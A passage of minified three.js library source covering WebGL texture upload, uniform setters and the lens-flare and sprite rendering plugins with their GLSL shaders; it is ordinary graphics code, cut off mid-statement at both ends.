c=!1,d=null,e=null,f=null,g=null,h=null,k=null,l=null,n=null;this.setTest=function(c){c?b.enable(a.STENCIL_TEST):b.disable(a.STENCIL_TEST)};this.setMask=function(b){d===b||c||(a.stencilMask(b),d=b)};this.setFunc=function(b,c,d){if(e!==b||f!==c||g!==d)a.stencilFunc(b,c,d),e=b,f=c,g=d};this.setOp=function(b,c,d){if(h!==b||k!==c||l!==d)a.stencilOp(b,c,d),h=b,k=c,l=d};this.setLocked=function(a){c=a};this.setClear=function(b){n!==b&&(a.clearStencil(b),n=b)};this.reset=\nfunction(){c=!1;n=l=k=h=g=f=e=d=null}};\nTHREE.WebGLTextures=function(a,b,c,d,e,f,g){function h(a,b){if(a.width>b||a.height>b){var c=b/Math.max(a.width,a.height),d=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\");d.width=Math.floor(a.width*c);d.height=Math.floor(a.height*c);d.getContext(\"2d\").drawImage(a,0,0,a.width,a.height,0,0,d.width,d.height);console.warn(\"THREE.WebGLRenderer: image is too big (\"+a.width+\"x\"+a.height+\"). Resized to \"+d.width+\"x\"+d.height,a);return d}return a}function k(a){return THREE.Math.isPowerOfTwo(a.width)&&THREE.Math.isPowerOfTwo(a.height)}\nfunction l(b){return b===THREE.NearestFilter||b===THREE.NearestMipMapNearestFilter||b===THREE.NearestMipMapLinearFilter?a.NEAREST:a.LINEAR}function n(b){b=b.target;b.removeEventListener(\"dispose\",n);a:{var c=d.get(b);if(b.image&&c.__image__webglTextureCube)a.deleteTexture(c.__image__webglTextureCube);else{if(void 0===c.__webglInit)break a;a.deleteTexture(c.__webglTexture)}d.delete(b)}t.textures--}function p(b){b=b.target;b.removeEventListener(\"dispose\",p);var c=d.get(b),e=d.get(b.texture);if(b){void 0!==\ne.__webglTexture&&a.deleteTexture(e.__webglTexture);b.depthTexture&&b.depthTexture.dispose();if(b instanceof THREE.WebGLRenderTargetCube)for(e=0;6>e;e++)a.deleteFramebuffer(c.__webglFramebuffer[e]),c.__webglDepthbuffer&&a.deleteRenderbuffer(c.__webglDepthbuffer[e]);else a.deleteFramebuffer(c.__webglFramebuffer),c.__webglDepthbuffer&&a.deleteRenderbuffer(c.__webglDepthbuffer);d.delete(b.texture);d.delete(b)}t.textures--}function m(b,g){var m=d.get(b);if(0<b.version&&m.__version!==b.version){var l=\nb.image;if(void 0===l)console.warn(\"THREE.WebGLRenderer: Texture marked for update but image is undefined\",b);else if(!1===l.complete)console.warn(\"THREE.WebGLRenderer: Texture marked for update but image is incomplete\",b);else{void 0===m.__webglInit&&(m.__webglInit=!0,b.addEventListener(\"dispose\",n),m.__webglTexture=a.createTexture(),t.textures++);c.activeTexture(a.TEXTURE0+g);c.bindTexture(a.TEXTURE_2D,m.__webglTexture);a.pixelStorei(a.UNPACK_FLIP_Y_WEBGL,b.flipY);a.pixelStorei(a.UNPACK_PREMULTIPLY_ALPHA_WEBGL,\nb.premultiplyAlpha);a.pixelStorei(a.UNPACK_ALIGNMENT,b.unpackAlignment);var p=h(b.image,e.maxTextureSize);if((b.wrapS!==THREE.ClampToEdgeWrapping||b.wrapT!==THREE.ClampToEdgeWrapping||b.minFilter!==THREE.NearestFilter&&b.minFilter!==THREE.LinearFilter)&&!1===k(p))if(l=p,l instanceof HTMLImageElement||l instanceof HTMLCanvasElement){var r=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\");r.width=THREE.Math.nearestPowerOfTwo(l.width);r.height=THREE.Math.nearestPowerOfTwo(l.height);r.getContext(\"2d\").drawImage(l,\n0,0,r.width,r.height);console.warn(\"THREE.WebGLRenderer: image is not power of two (\"+l.width+\"x\"+l.height+\"). Resized to \"+r.width+\"x\"+r.height,l);p=r}else p=l;var l=k(p),r=f(b.format),s=f(b.type);q(a.TEXTURE_2D,b,l);var I=b.mipmaps;if(b instanceof THREE.DepthTexture){I=a.DEPTH_COMPONENT;if(b.type===THREE.FloatType){if(!u)throw Error(\"Float Depth Texture only supported in WebGL2.0\");I=a.DEPTH_COMPONENT32F}else u&&(I=a.DEPTH_COMPONENT16);c.texImage2D(a.TEXTURE_2D,0,I,p.width,p.height,0,r,s,null)}else if(b instanceof\nTHREE.DataTexture)if(0<I.length&&l){for(var B=0,F=I.length;B<F;B++)p=I[B],c.texImage2D(a.TEXTURE_2D,B,r,p.width,p.height,0,r,s,p.data);b.generateMipmaps=!1}else c.texImage2D(a.TEXTURE_2D,0,r,p.width,p.height,0,r,s,p.data);else if(b instanceof THREE.CompressedTexture)for(B=0,F=I.length;B<F;B++)p=I[B],b.format!==THREE.RGBAFormat&&b.format!==THREE.RGBFormat?-1<c.getCompressedTextureFormats().indexOf(r)?c.compressedTexImage2D(a.TEXTURE_2D,B,r,p.width,p.height,0,p.data):console.warn(\"THREE.WebGLRenderer: Attempt to load unsupported compressed texture format in .uploadTexture()\"):\nc.texImage2D(a.TEXTURE_2D,B,r,p.width,p.height,0,r,s,p.data);else if(0<I.length&&l){B=0;for(F=I.length;B<F;B++)p=I[B],c.texImage2D(a.TEXTURE_2D,B,r,r,s,p);b.generateMipmaps=!1}else c.texImage2D(a.TEXTURE_2D,0,r,r,s,p);b.generateMipmaps&&l&&a.generateMipmap(a.TEXTURE_2D);m.__version=b.version;if(b.onUpdate)b.onUpdate(b);return}}c.activeTexture(a.TEXTURE0+g);c.bindTexture(a.TEXTURE_2D,m.__webglTexture)}function q(c,g,h){h?(a.texParameteri(c,a.TEXTURE_WRAP_S,f(g.wrapS)),a.texParameteri(c,a.TEXTURE_WRAP_T,\nf(g.wrapT)),a.texParameteri(c,a.TEXTURE_MAG_FILTER,f(g.magFilter)),a.texParameteri(c,a.TEXTURE_MIN_FILTER,f(g.minFilter))):(a.texParameteri(c,a.TEXTURE_WRAP_S,a.CLAMP_TO_EDGE),a.texParameteri(c,a.TEXTURE_WRAP_T,a.CLAMP_TO_EDGE),g.wrapS===THREE.ClampToEdgeWrapping&&g.wrapT===THREE.ClampToEdgeWrapping||console.warn(\"THREE.WebGLRenderer: Texture is not power of two. Texture.wrapS and Texture.wrapT should be set to THREE.ClampToEdgeWrapping.\",g),a.texParameteri(c,a.TEXTURE_MAG_FILTER,l(g.magFilter)),\na.texParameteri(c,a.TEXTURE_MIN_FILTER,l(g.minFilter)),g.minFilter!==THREE.NearestFilter&&g.minFilter!==THREE.LinearFilter&&console.warn(\"THREE.WebGLRenderer: Texture is not power of two. Texture.minFilter should be set to THREE.NearestFilter or THREE.LinearFilter.\",g));!(h=b.get(\"EXT_texture_filter_anisotropic\"))||g.type===THREE.FloatType&&null===b.get(\"OES_texture_float_linear\")||g.type===THREE.HalfFloatType&&null===b.get(\"OES_texture_half_float_linear\")||!(1<g.anisotropy||d.get(g).__currentAnisotropy)||\n(a.texParameterf(c,h.TEXTURE_MAX_ANISOTROPY_EXT,Math.min(g.anisotropy,e.getMaxAnisotropy())),d.get(g).__currentAnisotropy=g.anisotropy)}function r(b,e,g,h){var k=f(e.texture.format),l=f(e.texture.type);c.texImage2D(h,0,k,e.width,e.height,0,k,l,null);a.bindFramebuffer(a.FRAMEBUFFER,b);a.framebufferTexture2D(a.FRAMEBUFFER,g,h,d.get(e.texture).__webglTexture,0);a.bindFramebuffer(a.FRAMEBUFFER,null)}function s(b,c){a.bindRenderbuffer(a.RENDERBUFFER,b);c.depthBuffer&&!c.stencilBuffer?(a.renderbufferStorage(a.RENDERBUFFER,\na.DEPTH_COMPONENT16,c.width,c.height),a.framebufferRenderbuffer(a.FRAMEBUFFER,a.DEPTH_ATTACHMENT,a.RENDERBUFFER,b)):c.depthBuffer&&c.stencilBuffer?(a.renderbufferStorage(a.RENDERBUFFER,a.DEPTH_STENCIL,c.width,c.height),a.framebufferRenderbuffer(a.FRAMEBUFFER,a.DEPTH_STENCIL_ATTACHMENT,a.RENDERBUFFER,b)):a.renderbufferStorage(a.RENDERBUFFER,a.RGBA4,c.width,c.height);a.bindRenderbuffer(a.RENDERBUFFER,null)}var t=g.memory,u=\"undefined\"!==typeof WebGL2RenderingContext&&a instanceof WebGL2RenderingContext;\nthis.setTexture2D=m;this.setTextureCube=function(b,g){var l=d.get(b);if(6===b.image.length)if(0<b.version&&l.__version!==b.version){l.__image__webglTextureCube||(b.addEventListener(\"dispose\",n),l.__image__webglTextureCube=a.createTexture(),t.textures++);c.activeTexture(a.TEXTURE0+g);c.bindTexture(a.TEXTURE_CUBE_MAP,l.__image__webglTextureCube);a.pixelStorei(a.UNPACK_FLIP_Y_WEBGL,b.flipY);for(var m=b instanceof THREE.CompressedTexture,p=b.image[0]instanceof THREE.DataTexture,r=[],s=0;6>s;s++)r[s]=\nm||p?p?b.image[s].image:b.image[s]:h(b.image[s],e.maxCubemapSize);var u=k(r[0]),B=f(b.format),F=f(b.type);q(a.TEXTURE_CUBE_MAP,b,u);for(s=0;6>s;s++)if(m)for(var K,P=r[s].mipmaps,M=0,H=P.length;M<H;M++)K=P[M],b.format!==THREE.RGBAFormat&&b.format!==THREE.RGBFormat?-1<c.getCompressedTextureFormats().indexOf(B)?c.compressedTexImage2D(a.TEXTURE_CUBE_MAP_POSITIVE_X+s,M,B,K.width,K.height,0,K.data):console.warn(\"THREE.WebGLRenderer: Attempt to load unsupported compressed texture format in .setTextureCube()\"):\nc.texImage2D(a.TEXTURE_CUBE_MAP_POSITIVE_X+s,M,B,K.width,K.height,0,B,F,K.data);else p?c.texImage2D(a.TEXTURE_CUBE_MAP_POSITIVE_X+s,0,B,r[s].width,r[s].height,0,B,F,r[s].data):c.texImage2D(a.TEXTURE_CUBE_MAP_POSITIVE_X+s,0,B,B,F,r[s]);b.generateMipmaps&&u&&a.generateMipmap(a.TEXTURE_CUBE_MAP);l.__version=b.version;if(b.onUpdate)b.onUpdate(b)}else c.activeTexture(a.TEXTURE0+g),c.bindTexture(a.TEXTURE_CUBE_MAP,l.__image__webglTextureCube)};this.setTextureCubeDynamic=function(b,e){c.activeTexture(a.TEXTURE0+\ne);c.bindTexture(a.TEXTURE_CUBE_MAP,d.get(b).__webglTexture)};this.setupRenderTarget=function(b){var e=d.get(b),f=d.get(b.texture);b.addEventListener(\"dispose\",p);f.__webglTexture=a.createTexture();t.textures++;var g=b instanceof THREE.WebGLRenderTargetCube,h=k(b);if(g){e.__webglFramebuffer=[];for(var l=0;6>l;l++)e.__webglFramebuffer[l]=a.createFramebuffer()}else e.__webglFramebuffer=a.createFramebuffer();if(g){c.bindTexture(a.TEXTURE_CUBE_MAP,f.__webglTexture);q(a.TEXTURE_CUBE_MAP,b.texture,h);for(l=\n0;6>l;l++)r(e.__webglFramebuffer[l],b,a.COLOR_ATTACHMENT0,a.TEXTURE_CUBE_MAP_POSITIVE_X+l);b.texture.generateMipmaps&&h&&a.generateMipmap(a.TEXTURE_CUBE_MAP);c.bindTexture(a.TEXTURE_CUBE_MAP,null)}else c.bindTexture(a.TEXTURE_2D,f.__webglTexture),q(a.TEXTURE_2D,b.texture,h),r(e.__webglFramebuffer,b,a.COLOR_ATTACHMENT0,a.TEXTURE_2D),b.texture.generateMipmaps&&h&&a.generateMipmap(a.TEXTURE_2D),c.bindTexture(a.TEXTURE_2D,null);if(b.depthBuffer){e=d.get(b);f=b instanceof THREE.WebGLRenderTargetCube;if(b.depthTexture){if(f)throw Error(\"target.depthTexture not supported in Cube render targets\");\nif(b instanceof THREE.WebGLRenderTargetCube)throw Error(\"Depth Texture with cube render targets is not supported!\");a.bindFramebuffer(a.FRAMEBUFFER,e.__webglFramebuffer);if(!(b.depthTexture instanceof THREE.DepthTexture))throw Error(\"renderTarget.depthTexture must be an instance of THREE.DepthTexture\");d.get(b.depthTexture).__webglTexture&&b.depthTexture.image.width===b.width&&b.depthTexture.image.height===b.height||(b.depthTexture.image.width=b.width,b.depthTexture.image.height=b.height,b.depthTexture.needsUpdate=\n!0);m(b.depthTexture,0);b=d.get(b.depthTexture).__webglTexture;a.framebufferTexture2D(a.FRAMEBUFFER,a.DEPTH_ATTACHMENT,a.TEXTURE_2D,b,0)}else if(f)for(e.__webglDepthbuffer=[],f=0;6>f;f++)a.bindFramebuffer(a.FRAMEBUFFER,e.__webglFramebuffer[f]),e.__webglDepthbuffer[f]=a.createRenderbuffer(),s(e.__webglDepthbuffer[f],b);else a.bindFramebuffer(a.FRAMEBUFFER,e.__webglFramebuffer),e.__webglDepthbuffer=a.createRenderbuffer(),s(e.__webglDepthbuffer,b);a.bindFramebuffer(a.FRAMEBUFFER,null)}};this.updateRenderTargetMipmap=\nfunction(b){var e=b.texture;e.generateMipmaps&&k(b)&&e.minFilter!==THREE.NearestFilter&&e.minFilter!==THREE.LinearFilter&&(b=b instanceof THREE.WebGLRenderTargetCube?a.TEXTURE_CUBE_MAP:a.TEXTURE_2D,e=d.get(e).__webglTexture,c.bindTexture(b,e),a.generateMipmap(b),c.bindTexture(b,null))}};\nTHREE.WebGLUniforms=function(){var a=new THREE.Texture,b=new THREE.CubeTexture,c=[],d=[],e=function(a,b,d){var e=a[0];if(0>=e||0<e)return a;var f=b*d,g=c[f];void 0===g&&(g=new Float32Array(f),c[f]=g);if(0!==b)for(e.toArray(g,0),e=1,f=0;e!==b;++e)f+=d,a[e].toArray(g,f);return g},f=function(a,b){var c=d[b];void 0===c&&(c=new Int32Array(b),d[b]=c);for(var e=0;e!==b;++e)c[e]=a.allocTextureUnit();return c},g=function(a,b){a.uniform1f(this.addr,b)},h=function(a,b){a.uniform1i(this.addr,b)},k=function(a,\nb){void 0===b.x?a.uniform2fv(this.addr,b):a.uniform2f(this.addr,b.x,b.y)},l=function(a,b){void 0!==b.x?a.uniform3f(this.addr,b.x,b.y,b.z):void 0!==b.r?a.uniform3f(this.addr,b.r,b.g,b.b):a.uniform3fv(this.addr,b)},n=function(a,b){void 0===b.x?a.uniform4fv(this.addr,b):a.uniform4f(this.addr,b.x,b.y,b.z,b.w)},p=function(a,b){a.uniformMatrix2fv(this.addr,!1,b.elements||b)},m=function(a,b){a.uniformMatrix3fv(this.addr,!1,b.elements||b)},q=function(a,b){a.uniformMatrix4fv(this.addr,!1,b.elements||b)},r=\nfunction(b,c,d){var e=d.allocTextureUnit();b.uniform1i(this.addr,e);d.setTexture2D(c||a,e)},s=function(a,c,d){var e=d.allocTextureUnit();a.uniform1i(this.addr,e);d.setTextureCube(c||b,e)},t=function(a,b){a.uniform2iv(this.addr,b)},u=function(a,b){a.uniform3iv(this.addr,b)},v=function(a,b){a.uniform4iv(this.addr,b)},C=function(a){switch(a){case 5126:return g;case 35664:return k;case 35665:return l;case 35666:return n;case 35674:return p;case 35675:return m;case 35676:return q;case 35678:return r;case 35680:return s;\ncase 5124:case 35670:return h;case 35667:case 35671:return t;case 35668:case 35672:return u;case 35669:case 35673:return v}},w=function(a,b){a.uniform1fv(this.addr,b)},E=function(a,b){a.uniform1iv(this.addr,b)},z=function(a,b){a.uniform2fv(this.addr,e(b,this.size,2))},y=function(a,b){a.uniform3fv(this.addr,e(b,this.size,3))},A=function(a,b){a.uniform4fv(this.addr,e(b,this.size,4))},I=function(a,b){a.uniformMatrix2fv(this.addr,!1,e(b,this.size,4))},B=function(a,b){a.uniformMatrix3fv(this.addr,!1,e(b,\nthis.size,9))},F=function(a,b){a.uniformMatrix4fv(this.addr,!1,e(b,this.size,16))},K=function(b,c,d){var e=c.length,g=f(d,e);b.uniform1iv(this.addr,g);for(b=0;b!==e;++b)d.setTexture2D(c[b]||a,g[b])},P=function(a,c,d){var e=c.length,g=f(d,e);a.uniform1iv(this.addr,g);for(a=0;a!==e;++a)d.setTextureCube(c[a]||b,g[a])},M=function(a){switch(a){case 5126:return w;case 35664:return z;case 35665:return y;case 35666:return A;case 35674:return I;case 35675:return B;case 35676:return F;case 35678:return K;case 35680:return P;\ncase 5124:case 35670:return E;case 35667:case 35671:return t;case 35668:case 35672:return u;case 35669:case 35673:return v}},H=function(a,b,c){this.id=a;this.addr=c;this.setValue=C(b.type)},L=function(a,b,c){this.id=a;this.addr=c;this.size=b.size;this.setValue=M(b.type)},O=function(a){this.id=a;this.seq=[];this.map={}};O.prototype.setValue=function(a,b){for(var c=this.seq,d=0,e=c.length;d!==e;++d){var f=c[d];f.setValue(a,b[f.id])}};var N=/([\\w\\d_]+)(\\])?(\\[|\\.)?/g,Q=function(a,b,c){this.seq=[];this.map=\n{};this.renderer=c;c=a.getProgramParameter(b,a.ACTIVE_UNIFORMS);for(var d=0;d!==c;++d){var e=a.getActiveUniform(b,d),f=a.getUniformLocation(b,e.name),g=this,h=e.name,k=h.length;for(N.lastIndex=0;;){var l=N.exec(h),m=N.lastIndex,n=l[1],p=l[3];\"]\"===l[2]&&(n|=0);if(void 0===p||\"[\"===p&&m+2===k){h=g;e=void 0===p?new H(n,e,f):new L(n,e,f);h.seq.push(e);h.map[e.id]=e;break}else p=g.map[n],void 0===p&&(p=new O(n),n=g,g=p,n.seq.push(g),n.map[g.id]=g),g=p}}};Q.prototype.setValue=function(a,b,c){b=this.map[b];\nvoid 0!==b&&b.setValue(a,c,this.renderer)};Q.prototype.set=function(a,b,c){var d=this.map[c];void 0!==d&&d.setValue(a,b[c],this.renderer)};Q.prototype.setOptional=function(a,b,c){b=b[c];void 0!==b&&this.setValue(a,c,b)};Q.upload=function(a,b,c,d){for(var e=0,f=b.length;e!==f;++e){var g=b[e],h=c[g.id];!1!==h.needsUpdate&&g.setValue(a,h.value,d)}};Q.seqWithValue=function(a,b){for(var c=[],d=0,e=a.length;d!==e;++d){var f=a[d];f.id in b&&c.push(f)}return c};Q.splitDynamic=function(a,b){for(var c=null,\nd=a.length,e=0,f=0;f!==d;++f){var g=a[f],h=b[g.id];h&&!0===h.dynamic?(null===c&&(c=[]),c.push(g)):(e<f&&(a[e]=g),++e)}e<d&&(a.length=e);return c};Q.evalDynamic=function(a,b,c,d){for(var e=0,f=a.length;e!==f;++e){var g=b[a[e].id],h=g.onUpdateCallback;void 0!==h&&h.call(g,c,d)}};return Q}();\nTHREE.LensFlarePlugin=function(a,b){var c,d,e,f,g,h,k,l,n,p,m=a.context,q=a.state,r,s,t,u,v,C;this.render=function(w,E,z){if(0!==b.length){w=new THREE.Vector3;var y=z.w/z.z,A=.5*z.z,I=.5*z.w,B=16/z.w,F=new THREE.Vector2(B*y,B),K=new THREE.Vector3(1,1,0),P=new THREE.Vector2(1,1),M=new THREE.Box2;M.min.set(0,0);M.max.set(z.z-16,z.w-16);if(void 0===u){var B=new Float32Array([-1,-1,0,0,1,-1,1,0,1,1,1,1,-1,1,0,1]),H=new Uint16Array([0,1,2,0,2,3]);r=m.createBuffer();s=m.createBuffer();m.bindBuffer(m.ARRAY_BUFFER,\nr);m.bufferData(m.ARRAY_BUFFER,B,m.STATIC_DRAW);m.bindBuffer(m.ELEMENT_ARRAY_BUFFER,s);m.bufferData(m.ELEMENT_ARRAY_BUFFER,H,m.STATIC_DRAW);v=m.createTexture();C=m.createTexture();q.bindTexture(m.TEXTURE_2D,v);m.texImage2D(m.TEXTURE_2D,0,m.RGB,16,16,0,m.RGB,m.UNSIGNED_BYTE,null);m.texParameteri(m.TEXTURE_2D,m.TEXTURE_WRAP_S,m.CLAMP_TO_EDGE);m.texParameteri(m.TEXTURE_2D,m.TEXTURE_WRAP_T,m.CLAMP_TO_EDGE);m.texParameteri(m.TEXTURE_2D,m.TEXTURE_MAG_FILTER,m.NEAREST);m.texParameteri(m.TEXTURE_2D,m.TEXTURE_MIN_FILTER,\nm.NEAREST);q.bindTexture(m.TEXTURE_2D,C);m.texImage2D(m.TEXTURE_2D,0,m.RGBA,16,16,0,m.RGBA,m.UNSIGNED_BYTE,null);m.texParameteri(m.TEXTURE_2D,m.TEXTURE_WRAP_S,m.CLAMP_TO_EDGE);m.texParameteri(m.TEXTURE_2D,m.TEXTURE_WRAP_T,m.CLAMP_TO_EDGE);m.texParameteri(m.TEXTURE_2D,m.TEXTURE_MAG_FILTER,m.NEAREST);m.texParameteri(m.TEXTURE_2D,m.TEXTURE_MIN_FILTER,m.NEAREST);var B=t={vertexShader:\"uniform lowp int renderType;\\nuniform vec3 screenPosition;\\nuniform vec2 scale;\\nuniform float rotation;\\nuniform sampler2D occlusionMap;\\nattribute vec2 position;\\nattribute vec2 uv;\\nvarying vec2 vUV;\\nvarying float vVisibility;\\nvoid main() {\\nvUV = uv;\\nvec2 pos = position;\\nif ( renderType == 2 ) {\\nvec4 visibility = texture2D( occlusionMap, vec2( 0.1, 0.1 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.5, 0.1 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.9, 0.1 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.9, 0.5 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.9, 0.9 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.5, 0.9 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.1, 0.9 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.1, 0.5 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.5, 0.5 ) );\\nvVisibility =        visibility.r / 9.0;\\nvVisibility *= 1.0 - visibility.g / 9.0;\\nvVisibility *=       visibility.b / 9.0;\\nvVisibility *= 1.0 - visibility.a / 9.0;\\npos.x = cos( rotation ) * position.x - sin( rotation ) * position.y;\\npos.y = sin( rotation ) * position.x + cos( rotation ) * position.y;\\n}\\ngl_Position = vec4( ( pos * scale + screenPosition.xy ).xy, screenPosition.z, 1.0 );\\n}\",\nfragmentShader:\"uniform lowp int renderType;\\nuniform sampler2D map;\\nuniform float opacity;\\nuniform vec3 color;\\nvarying vec2 vUV;\\nvarying float vVisibility;\\nvoid main() {\\nif ( renderType == 0 ) {\\ngl_FragColor = vec4( 1.0, 0.0, 1.0, 0.0 );\\n} else if ( renderType == 1 ) {\\ngl_FragColor = texture2D( map, vUV );\\n} else {\\nvec4 texture = texture2D( map, vUV );\\ntexture.a *= opacity * vVisibility;\\ngl_FragColor = texture;\\ngl_FragColor.rgb *= color;\\n}\\n}\"},H=m.createProgram(),L=m.createShader(m.FRAGMENT_SHADER),\nO=m.createShader(m.VERTEX_SHADER),N=\"precision \"+a.getPrecision()+\" float;\\n\";m.shaderSource(L,N+B.fragmentShader);m.shaderSource(O,N+B.vertexShader);m.compileShader(L);m.compileShader(O);m.attachShader(H,L);m.attachShader(H,O);m.linkProgram(H);u=H;n=m.getAttribLocation(u,\"position\");p=m.getAttribLocation(u,\"uv\");c=m.getUniformLocation(u,\"renderType\");d=m.getUniformLocation(u,\"map\");e=m.getUniformLocation(u,\"occlusionMap\");f=m.getUniformLocation(u,\"opacity\");g=m.getUniformLocation(u,\"color\");h=m.getUniformLocation(u,\n\"scale\");k=m.getUniformLocation(u,\"rotation\");l=m.getUniformLocation(u,\"screenPosition\")}m.useProgram(u);q.initAttributes();q.enableAttribute(n);q.enableAttribute(p);q.disableUnusedAttributes();m.uniform1i(e,0);m.uniform1i(d,1);m.bindBuffer(m.ARRAY_BUFFER,r);m.vertexAttribPointer(n,2,m.FLOAT,!1,16,0);m.vertexAttribPointer(p,2,m.FLOAT,!1,16,8);m.bindBuffer(m.ELEMENT_ARRAY_BUFFER,s);q.disable(m.CULL_FACE);q.setDepthWrite(!1);H=0;for(L=b.length;H<L;H++)if(B=16/z.w,F.set(B*y,B),O=b[H],w.set(O.matrixWorld.elements[12],\nO.matrixWorld.elements[13],O.matrixWorld.elements[14]),w.applyMatrix4(E.matrixWorldInverse),w.applyProjection(E.projectionMatrix),K.copy(w),P.x=z.x+K.x*A+A-8,P.y=z.y+K.y*I+I-8,!0===M.containsPoint(P)){q.activeTexture(m.TEXTURE0);q.bindTexture(m.TEXTURE_2D,null);q.activeTexture(m.TEXTURE1);q.bindTexture(m.TEXTURE_2D,v);m.copyTexImage2D(m.TEXTURE_2D,0,m.RGB,P.x,P.y,16,16,0);m.uniform1i(c,0);m.uniform2f(h,F.x,F.y);m.uniform3f(l,K.x,K.y,K.z);q.disable(m.BLEND);q.enable(m.DEPTH_TEST);m.drawElements(m.TRIANGLES,\n6,m.UNSIGNED_SHORT,0);q.activeTexture(m.TEXTURE0);q.bindTexture(m.TEXTURE_2D,C);m.copyTexImage2D(m.TEXTURE_2D,0,m.RGBA,P.x,P.y,16,16,0);m.uniform1i(c,1);q.disable(m.DEPTH_TEST);q.activeTexture(m.TEXTURE1);q.bindTexture(m.TEXTURE_2D,v);m.drawElements(m.TRIANGLES,6,m.UNSIGNED_SHORT,0);O.positionScreen.copy(K);O.customUpdateCallback?O.customUpdateCallback(O):O.updateLensFlares();m.uniform1i(c,2);q.enable(m.BLEND);for(var N=0,Q=O.lensFlares.length;N<Q;N++){var J=O.lensFlares[N];.001<J.opacity&&.001<J.scale&&\n(K.x=J.x,K.y=J.y,K.z=J.z,B=J.size*J.scale/z.w,F.x=B*y,F.y=B,m.uniform3f(l,K.x,K.y,K.z),m.uniform2f(h,F.x,F.y),m.uniform1f(k,J.rotation),m.uniform1f(f,J.opacity),m.uniform3f(g,J.color.r,J.color.g,J.color.b),q.setBlending(J.blending,J.blendEquation,J.blendSrc,J.blendDst),a.setTexture2D(J.texture,1),m.drawElements(m.TRIANGLES,6,m.UNSIGNED_SHORT,0))}}q.enable(m.CULL_FACE);q.enable(m.DEPTH_TEST);q.setDepthWrite(!0);a.resetGLState()}}};\nTHREE.SpritePlugin=function(a,b){var c,d,e,f,g,h,k,l,n,p,m,q,r,s,t,u,v;function C(a,b){return a.renderOrder!==b.renderOrder?a.renderOrder-b.renderOrder:a.z!==b.z?b.z-a.z:b.id-a.id}var w=a.context,E=a.state,z,y,A,I,B=new THREE.Vector3,F=new THREE.Quaternion,K=new THREE.Vector3;this.render=function(P,M){if(0!==b.length){if(void 0===A){var H=new Float32Array([-.5,-.5,0,0,.5,-.5,1,0,.5,.5,1,1,-.5,.5,0,1]),L=new Uint16Array([0,1,2,0,2,3]);z=w.createBuffer();y=w.createBuffer();w.bindBuffer(w.ARRAY_BUFFER,\nz);w.bufferData(w.ARRAY_BUFFER,H,w.STATIC_DRAW);w.bindBuffer(w.ELEMENT_ARRAY_BUFFER,y);w.bufferData(w.ELEMENT_ARRAY_BUFFER,L,w.STATIC_DRAW);var H=w.createProgram(),L=w.createShader(w.VERTEX_SHADER),O=w.createShader(w.FRAGMENT_SHADER);w.shaderSource(L,[\"precision \"+a.getPrecision()+\" float;\",\"uniform mat4 modelViewMatrix;\\nuniform mat4 projectionMatrix;\\nuniform float rotation;\\nuniform vec2 scale;\\nuniform vec2 uvOffset;\\nuniform vec2 uvScale;\\nattribute vec2 position;\\nattribute vec2 uv;\\nvarying vec2 vUV;\\nvoid main() {\\nvUV = uvOffset + uv * uvScale;\\nvec2 alignedPosition = position * scale;\\nvec2 rotatedPosition;\\nrotatedPosition.x = cos( rotation ) * alignedPosition.x - sin( rotation ) * alignedPosition.y;\\nrotatedPosition.y = sin( rotation ) * alignedPosition.x + cos( rotation ) * alignedPosition.y;\\nvec4 finalPosition;\\nfinalPosition = modelViewMatrix * vec4( 0.0, 0.0, 0.0, 1.0 );\\nfinalPosition.xy += rotatedPosition;\\nfinalPosition = projectionMatrix * finalPosition;\\ngl_Position = finalPosition;\\n}\"].join(\"\\n\"));\nw.shaderSource(O,[\"precision \"+a.getPrecision()+\" float;\",\"uniform vec3 color;\\nuniform sampler2D map;\\nuniform float opacity;\\nuniform int fogType;\\nuniform vec3 fogColor;\\nuniform float fogDensity;\\nuniform float fogNear;\\nuniform float fogFar;\\nuniform float alphaTest;\\nvarying vec2 vUV;\\nvoid main() {\\nvec4 texture = texture2D( map, vUV );\\nif ( texture.a < alphaTest ) discard;\\ngl_FragColor = vec4( color * texture.xyz, texture.a * opacity );\\nif ( fogType > 0 ) {\\nfloat depth = gl_FragCoord.z / gl_FragCoord.w;\\nfloat fogFactor = 0.0;\\nif ( fogType == 1 ) {\\nfogFactor = smoothstep( fogNear, fogFar, depth );\\n} else {\\nconst float LOG2 = 1.442695;\\nfogFactor = exp2( - fogDensity * fogDensity * depth * depth * LOG2 );\\nfogFactor = 1.0 - clamp( fogFactor, 0.0, 1.0 );\\n}\\ngl_FragColor = mix( gl_FragColor, vec4( fogColor, gl_FragColor.w ), fogFactor );\\n}\\n}\"].join(\"\\n\"));\nw.compileShader(L);w.compileShader(O);w.attachShader(H,L);w.attachShader(H,O);w.linkProgram(H);A=H;u=w.getAttribLocation(A,\"position\");v=w.getAttribLocation(A,\"uv\");c=w.getUniformLocation(A,\"uvOffset\");d=w.getUniformLocation(A,\"uvScale\");e=w.getUniformLocation(A,\"rotation\");f=w.getUniformLocation(A,\"scale\");g=w.getUniformLocation(A,\"color\");h=w.getUniformLocation(A,\"map\");k=w.getUniformLocation(A,\"opacity\");l=w.getUniformLocation(A,\"modelViewMatrix\");n=w.getUniformLocation(A,\"projectionMatrix\");p=\nw.getUniformLocation(A,\"fogType\");m=w.getUniformLocation(A,\"fogDensity\");q=w.getUniformLocation(A,\"fogNear\");r=w.getUniformLocation(A,\"fogFar\");s=w.getUniformLocation(A,\"fogColor\");t=w.getUniformLocation(A,\"alphaTest\");H=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\");H.width=8;H.height=8;L=H.getContext(\"2d\");L.fillStyle=\"white\";L.fillRect(0,0,8,8);I=new 